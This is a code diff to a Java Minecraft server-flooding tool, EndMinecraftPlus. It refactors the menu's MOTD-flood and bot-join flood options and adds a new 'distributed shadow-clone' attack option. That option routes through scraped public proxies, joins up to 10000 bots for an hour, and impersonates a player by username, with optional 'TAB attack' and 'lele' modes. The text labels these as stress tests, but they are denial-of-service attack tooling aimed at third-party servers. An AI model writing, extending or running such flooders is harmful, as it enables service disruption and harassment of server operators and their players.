@@ -10,10 +10,7 @@ import java.util.Scanner;
 
 import luohuayu.EndMinecraftPlus.Utils;
 import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
-import luohuayu.EndMinecraftPlus.tasks.attack.DistributedBotAttack;
-import luohuayu.EndMinecraftPlus.tasks.attack.DistributedMotdAttack;
-import luohuayu.EndMinecraftPlus.tasks.attack.IAttack;
-import luohuayu.EndMinecraftPlus.tasks.attack.MotdAttack;
+import luohuayu.EndMinecraftPlus.tasks.attack.*;
 import luohuayu.MCForgeProtocol.MCForge;
 import luohuayu.MCForgeProtocol.MCForgeMOTD;
 
@@ -37,8 +34,8 @@ public class Menu extends Utils {
         int time = getCo(scanner.nextLine(), 60);
         log("请输入线程数(10)");
         int thread = getCo(scanner.nextLine(), 16);
-        IAttack attack = new MotdAttack(time, thread, 0, false, false, null);
-        attack.start(ip, port);
+        IAttack attack = new MotdAttack(ip, port, time, thread, 0);
+        attack.start();
     }
 
     public void _2() {
@@ -56,8 +53,9 @@ public class Menu extends Utils {
         log("正在获取MOD列表..");
         Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
         log("MOD列表: " + Arrays.toString(modList.keySet().toArray()));
-        IAttack attack = new DistributedBotAttack(time, maxAttack, sleepTime, lele, tab, modList);
-        attack.start(ip, port);
+        DistributedBotAttack attack = new DistributedBotAttack(ip, port, time, maxAttack, sleepTime);
+        attack.setBotConfig(lele, tab, modList);
+        attack.start();
     }
 
     public void _3() {
@@ -67,8 +65,8 @@ public class Menu extends Utils {
         log("请输入线程数(10)");
         int thread = getCo(scanner.nextLine(), 16);
         getProxy();
-        IAttack attack = new DistributedMotdAttack(time, thread, 0, false, false, null);
-        attack.start(ip, port);
+        IAttack attack = new DistributedMotdAttack(ip, port, time, thread, 0);
+        attack.start();
     }
 
     public void getProxy() {
@@ -90,6 +88,33 @@ public class Menu extends Utils {
             ProxyPool.getProxysFromAPIs();
             ProxyPool.runUpdateProxysTask(1200);
         }
+    }
+
+    public void _4() {
+        log("分布式影分身压测选择", "请输入攻击时长！(3600s)");
+        int time = getCo(scanner.nextLine(), 3600);
+        log("请输入最大攻击数(10000)");
+        int maxAttack = getCo(scanner.nextLine(), 10000);
+        log("请输入每次加入服务器间隔(ms)");
+        int sleepTime = getCo(scanner.nextLine(), 0);
+        log("请输入玩家用户名(必填):");
+        String username = getCo(scanner.nextLine(), null);
+        if (username == null) {
+            log("用户名不能为空");
+            return;
+        }
+        log("请输入是否开启TAB攻击 y/n，默认关闭(n)");
+        boolean tab = getCo(scanner.nextLine(), "n").equals("y");
+        log("请输入是否开启操死乐乐模式 y/n，默认关闭(n)");
+        boolean lele = getCo(scanner.nextLine(), "n").equals("y");
+        getProxy();
+        log("正在获取MOD列表..");
+        Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
+        log("MOD列表: " + Arrays.toString(modList.keySet().toArray()));
+        DistributedDoubleAttack attack = new DistributedDoubleAttack(ip, port, time, maxAttack, sleepTime);
+        attack.setBotConfig(lele, tab, modList);
+        attack.setUsername(username);
+        attack.start();
     }
 
     public void selectVersion() {
